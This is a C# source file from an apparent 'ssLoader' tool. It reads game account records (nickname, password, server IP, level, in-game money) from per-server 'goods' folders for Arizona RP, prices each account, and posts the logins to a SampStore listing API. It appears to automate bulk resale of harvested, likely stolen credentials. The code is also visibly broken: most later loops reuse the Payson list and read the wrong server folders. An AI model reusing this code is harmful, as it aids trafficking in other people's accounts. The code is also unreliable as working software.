using ssLoader.Json;
using ssLoader.SampStoreAPI;
using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using JsonSerializer = System.Text.Json.JsonSerializer;

namespace ssLoader.Arizona
{
    public class AccountSender
    {
        private string getCurrDir = Directory.GetCurrentDirectory();
        private readonly Money money = new Money();
        public async Task ArizonaSender(string path)
        {
            try
            {
                #region создание экземпляров классов
                var arzSend = new AccountSender();
                var getAccounts = new GetAccounts();
                var accountSender = new AddAccount();
                var config = new Config();
                #endregion

                #region Десериализация json файлов
                using FileStream api_key = File.OpenRead(@$"{getCurrDir}\Config\Config.json");
                var jsonConfig = await JsonSerializer.DeserializeAsync<Config>(api_key);
                using FileStream openStream = File.OpenRead(@$"{getCurrDir}\Config\Money.json");
                var moneyPrice = await JsonSerializer.DeserializeAsync<Money>(openStream);
                #endregion

                #region ArizonaRP
                var arizonaFormat = new ArizonaFormat();
                var brainburgGoods = getAccounts.CheckNameArizonaBrainburg(path);

                foreach (var ARZ in brainburgGoods)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Brainburg\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                }
                var ChandlerGoods = getAccounts.CheckNameArizonaChandler(path);
                foreach (var ARZ in ChandlerGoods)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Chandler\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Gilbert = getAccounts.CheckNameArizonaGilbert(path);
                foreach (var ARZ in Gilbert)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Gilbert\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    // MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Glendale = getAccounts.CheckNameArizonaGlendale(path);
                foreach (var ARZ in Glendale)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Glendale\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Kingman = getAccounts.CheckNameArizonaGlendale(path);
                foreach (var ARZ in Kingman)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Kingman\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Mesa = getAccounts.CheckNameArizonaMesa(path);
                foreach (var ARZ in Mesa)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Mesa\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    // MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Payson = getAccounts.CheckNameArizonaPayson(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Mesa\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Phoenix = getAccounts.CheckNameArizonaPhoenix(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Phoenix\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Prescott = getAccounts.CheckNameArizonaPrescott(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Phoenix\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    // MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var RedRock = getAccounts.CheckNameArizonaRedRock(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Red Rock\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var SaintRose = getAccounts.CheckNameArizonaSaintRose(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Saint Rose\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Scottdale = getAccounts.CheckNameArizonaScottdale(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Scottdale\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    // MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Surprise = getAccounts.CheckNameArizonaScottdale(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Scottdale\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Tucson = getAccounts.CheckNameArizonaTucson(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Tucson\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Winslow = getAccounts.CheckNameArizonaWinslow(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Winslow\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                var Yuma = getAccounts.CheckNameArizonaYuma(path);
                foreach (var ARZ in Payson)
                {
                    var text = File.ReadAllText($@"{path}\Arizona RP\Yuma\goods\{ARZ}.json");
                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
                    await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
                    //MessageBox.Show($"ник {result.nick} Пароль: {result.password} Цена виртов {priceMoney} Виртов {result.money} Цена за лям {moneyPrice.ArizonaRP}");
                }
                #endregion

            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }
            finally
            {
                MessageBox.Show("Я все");
            }
        }
    }
}
